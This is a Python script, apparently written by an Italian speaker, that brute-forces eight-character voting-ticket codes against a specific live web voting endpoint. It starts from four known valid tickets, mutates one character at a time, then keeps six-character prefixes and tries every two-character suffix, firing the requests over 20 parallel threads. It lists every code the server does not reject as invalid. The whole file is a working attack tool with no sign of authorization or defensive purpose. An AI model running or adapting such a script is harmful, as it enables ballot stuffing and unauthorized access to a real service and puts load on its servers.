#!/usr/bin/env python3
import string
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://play-the-future-vfu.up.railway.app/vote"
CHARSET = string.ascii_uppercase + string.digits  # A-Z + 0-9 (36 chars)
INVALID_MARKERS = ["ticket non valido", "host not in allowlist"]
WORKERS = 20

KNOWN_VALID = [
    "RXKPIYFG",
    "SYU51IQK",
    "3NQJXOSP",
    "T2FXIVBS",
]


def check_code(code):
    url = f"{BASE_URL}/{code}"
    try:
        r = requests.get(url, timeout=10)
        body = r.text.lower()
        if not any(m in body for m in INVALID_MARKERS):
            return url, r.status_code, r.text[:300]
    except requests.RequestException as e:
        print(f"\n[ERR] {code}: {e}")
    return None


def single_mutation_candidates():
    """For each known ticket, mutate one position at a time through all charset symbols."""
    seen = set(KNOWN_VALID)
    for ticket in KNOWN_VALID:
        for pos in range(len(ticket)):
            for char in CHARSET:
                if char == ticket[pos]:
                    continue
                candidate = ticket[:pos] + char + ticket[pos+1:]
                if candidate not in seen:
                    seen.add(candidate)
                    yield candidate


def prefix_bruteforce_candidates(prefix_len=6):
    """Fix first N chars of each known ticket, brute-force the rest."""
    seen = set(KNOWN_VALID)
    suffix_len = 8 - prefix_len
    for ticket in KNOWN_VALID:
        prefix = ticket[:prefix_len]
        for suffix in itertools.product(CHARSET, repeat=suffix_len):
            candidate = prefix + "".join(suffix)
            if candidate not in seen:
                seen.add(candidate)
                yield candidate


def run_batch(label, candidates):
    candidates = list(candidates)
    total = len(candidates)
    valid = []
    print(f"\n{'='*60}")
    print(f"Strategia: {label}")
    print(f"Candidati : {total}")
    print(f"{'='*60}")
    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = {pool.submit(check_code, c): c for c in candidates}
        done = 0
        for future in as_completed(futures):
            done += 1
            code = futures[future]
            result = future.result()
            print(f"[{done:5}/{total}] {code}", end="\r")
            if result:
                url, status, preview = result
                valid.append(url)
                print(f"\n  *** VALIDO ***  {url}  (HTTP {status})")
                print(f"  Preview: {preview!r}\n")
    print(f"\nTrovati {len(valid)} validi su {total} testati.")
    return valid


def main():
    print(f"Ticket validi noti: {KNOWN_VALID}")
    all_valid = list(KNOWN_VALID)

    # Phase 1: single-position mutation (cheap, 1120 requests)
    found = run_batch("Single-position mutation (1 char alla volta)", single_mutation_candidates())
    all_valid.extend(found)

    # Phase 2: prefix brute-force last 2 chars (1296 × 4 tickets)
    found = run_batch("Prefix fix 6 char + brute-force ultimi 2", prefix_bruteforce_candidates(prefix_len=6))
    all_valid.extend(found)

    print(f"\n{'='*60}")
    print(f"TOTALE TICKET VALIDI TROVATI: {len(all_valid)}")
    for u in all_valid:
        print(f"  {u}")


if __name__ == "__main__":
    main()
